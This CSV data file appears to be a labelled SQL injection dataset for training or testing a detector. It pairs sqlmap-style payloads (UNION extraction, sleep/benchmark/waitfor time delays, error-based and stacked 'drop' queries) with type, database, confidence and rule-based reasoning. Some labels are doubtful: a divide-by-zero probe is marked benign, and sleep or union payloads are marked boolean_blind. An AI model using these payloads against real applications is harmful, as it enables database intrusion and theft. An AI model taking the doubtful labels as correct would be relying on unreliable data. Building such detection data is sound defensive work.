id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
19205,"iif ( 4638 = 8258,1,1/0 )",benign,generic,0.85,"No attack signals in payload 'iif ( 4638 = 8258,1,1/0 )'; no SQLi tokens (union/sleep/xmltype/and N=N/etc.) detected",3
19206,"-3873%' ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,generic,0.75,Token match: 'case when' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (a_type),2
19207,"1' ) as nvqk where 3917 = 3917 or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",boolean_blind,generic,0.85,"Token match: 'where 3917 = 3917', 'all_users t1,all_users t2' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (a_type+c_type)",3
19208,1' ) ) ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ( ( 'acml' like 'acml,time_blind,mysql,0.95,Token match: 'sleep (' → time_blind (P5); DB=mysql via \bsleep\b; sources confirm (a_type),2
19209,"1' ) ) ) union all select null,null,null,null--",union_based,generic,0.95,Token match: 'union all select' → union_based (P7); DB=generic via no DB-specific signature; sources confirm (a_type+c_type),3
19210,"1"" ) as rdvm where 6360 = 6360 and sleep ( 5 ) --",boolean_blind,mysql,0.75,"Token match: 'where 6360 = 6360', 'sleep (' → boolean_blind (P3); DB=mysql via \bsleep\b; sources confirm (c_type)",2
19211,"1"" ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( ""onhh"" = ""onhh",boolean_blind,generic,0.75,Token match: 'char ( 68 ) ||char' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (a_type),2
19212,"1' and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and 'blie' = 'blie",boolean_blind,mysql,0.95,"Token match: 'elt (', 'exp ( ~' → boolean_blind (P3); DB=mysql via \belt\b; sources confirm (a_type)",2
19213,"1"" where 7245 = 7245 and 9198 = 9198--",boolean_blind,generic,0.85,Token match: 'and 9198 = 9198' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (a_type+c_type),3
19214,"1' ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( 'yqmv' = 'yqmv",boolean_blind,generic,0.75,Token match: 'case when' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (a_type),2
19215,"1' and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) )",time_blind,sqlite,0.95,Token match: 'randomblob (' → time_blind (P5); DB=sqlite via \brandomblob\b; sources confirm (a_type),2
19216,"1 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )",time_blind,oracle,0.95,Token match: 'dbms_pipe.receive_message' → time_blind (P5); DB=oracle via \bdbms_pipe\b; sources confirm (a_type+c_type),3
19217,"1' and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and 'pbin' = 'pbin",time_blind,mysql,0.95,Token match: 'benchmark (' → time_blind (P5); DB=mysql via \bbenchmark\b; sources confirm (a_type),2
19218,"1"" ) ) ) and 4124 = 7245 and ( ( ( ""tuom"" = ""tuom",boolean_blind,generic,0.85,Token match: 'and 4124 = 7245' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (a_type+c_type),3
19219,1' ) as irnj where 7274 = 7274 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) --,boolean_blind,postgresql,0.75,"Token match: 'where 7274 = 7274', 'pg_sleep (' → boolean_blind (P3); DB=postgresql via \bpg_sleep\b; sources confirm (c_type)",2
19220,1' ) ) as fqia where 1936 = 1936 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) --,boolean_blind,mysql,0.75,"Token match: 'where 1936 = 1936', 'sleep (' → boolean_blind (P3); DB=mysql via \bsleep\b; sources confirm (c_type)",2
19221,-1479%' or 5201 = 3398--,boolean_blind,generic,0.85,Token match: 'or 5201 = 3398' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (a_type+c_type),3
19222,1'+ ( select enzd where 6046 = 6046 and ( 3020 = 3020 ) *6703 ) +',boolean_blind,generic,0.85,Token match: 'where 6046 = 6046' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (a_type+c_type),3
19223,if ( 8264 = 1939 ) select 8264 else drop function nsoq--,stacked_queries,generic,0.65,"Token match: 'if ( 8264 = 1939 ) select 8264 else drop' → stacked_queries (P8); DB=generic via no DB-specific signature; sources differ (a=boolean_blind,c=boolean_blind) — payload tokens prevail",1
19224,"1 ) as skby where 4269 = 4269 or elt ( 6272 = 6272,sleep ( 5 ) ) --",boolean_blind,mysql,0.95,"Token match: 'elt (', 'sleep (' → boolean_blind (P3); DB=mysql via \bsleep\b; sources confirm (a_type+c_type)",3
19225,"1'|| ( select 'hfbt' where 7204 = 7204 union all select null,null,null,null,null,null,null,null,null,null--",boolean_blind,generic,0.75,"Token match: 'where 7204 = 7204', 'union all select' → boolean_blind (P3); DB=generic via no DB-specific signature; sources differ (a=union_based,c=union_based) — payload tokens prevail",1
19226,"-5606 ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,generic,0.75,Token match: 'case when' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (a_type),2
19227,"1"" ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ""gozk"" = ""gozk",boolean_blind,oracle,0.75,Token match: 'case when' → boolean_blind (P3); DB=oracle via \bdual\b; sources confirm (a_type+c_type),3
19228,"1"" ) ) ) union all select null,null,null,null,null,null--",union_based,generic,0.95,Token match: 'union all select' → union_based (P7); DB=generic via no DB-specific signature; sources confirm (a_type+c_type),3
19229,"1 ) ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",boolean_blind,mysql,0.95,"Token match: 'elt (', 'sleep (' → boolean_blind (P3); DB=mysql via \bsleep\b; sources confirm (a_type)",2
19230,"-3805"" ) ) ) union all select 9123,9123,9123,9123,9123,9123,9123,9123#",union_based,generic,0.95,Token match: 'union all select' → union_based (P7); DB=generic via no DB-specific signature; sources confirm (a_type+c_type),3
19231,"-4970' ) union all select 4625,4625,4625,4625,4625,4625,4625,4625#",union_based,generic,0.95,Token match: 'union all select' → union_based (P7); DB=generic via no DB-specific signature; sources confirm (a_type+c_type),3
19232,"1' ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) )",boolean_blind,mysql,0.95,Token match: 'elt (' → boolean_blind (P3); DB=mysql via \belt\b; sources confirm (a_type),2
19233,"1"" ) ) ) procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,mysql,0.95,"Token match: 'extractvalue (', 'benchmark (' → error_based (P4); DB=mysql via \bextractvalue\b; sources confirm (a_type)",2
19234,1' ) where 8204 = 8204,boolean_blind,generic,0.75,Token match: 'where 8204 = 8204' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (c_type),2
19235,"1' ) ) ) and make_set ( 8403 = 8403,8899 ) and ( ( ( 'llfp' = 'llfp",boolean_blind,generic,0.75,Token match: 'make_set (' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (a_type),2
19236,1' ) ) as wuws where 6917 = 6917 union all select null#,boolean_blind,generic,0.75,"Token match: 'where 6917 = 6917', 'union all select' → boolean_blind (P3); DB=generic via no DB-specific signature; sources differ (a=union_based,c=union_based) — payload tokens prevail",1
19237,"1 and elt ( 2770 = 3669,3669 ) # sfls",boolean_blind,mysql,0.95,Token match: 'elt (' → boolean_blind (P3); DB=mysql via \belt\b; sources confirm (a_type),2
19238,"-3566' where 3641 = 3641 union all select 3641,3641,3641,3641,3641#",boolean_blind,generic,0.75,"Token match: 'where 3641 = 3641', 'union all select' → boolean_blind (P3); DB=generic via no DB-specific signature; sources differ (a=union_based,c=union_based) — payload tokens prevail",1
19239,"1"" ) ) as riui where 2605 = 2605",boolean_blind,generic,0.75,Token match: 'where 2605 = 2605' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (c_type),2
19240,"1' and make_set ( 8403 = 8403,8899 ) and 'lnwe' = 'lnwe",boolean_blind,generic,0.75,Token match: 'make_set (' → boolean_blind (P3); DB=generic via no DB-specific signature; sources confirm (a_type),2
19241,"-5043%' ) ) ) union all select 5860,5860,5860,5860,5860#",union_based,generic,0.95,Token match: 'union all select' → union_based (P7); DB=generic via no DB-specific signature; sources confirm (a_type+c_type),3
19242,1 ) waitfor delay '0:0:5'--,time_blind,mssql,0.95,Token match: 'waitfor delay' → time_blind (P5); DB=mssql via \bwaitfor\s+delay\b; sources confirm (a_type+c_type),3
19243,-8519%' ) ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( '%' = ',boolean_blind,oracle,0.65,"Token match: 'case when', 'utl_inaddr.get_host_address' → boolean_blind (P3); DB=oracle via \bdual\b; sources differ (a=error_based,c=error_based) — payload tokens prevail",1
19244,"1"" and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ""jgcv"" = ""jgcv",boolean_blind,oracle,0.75,Token match: 'case when' → boolean_blind (P3); DB=oracle via \bdual\b; sources confirm (a_type+c_type),3
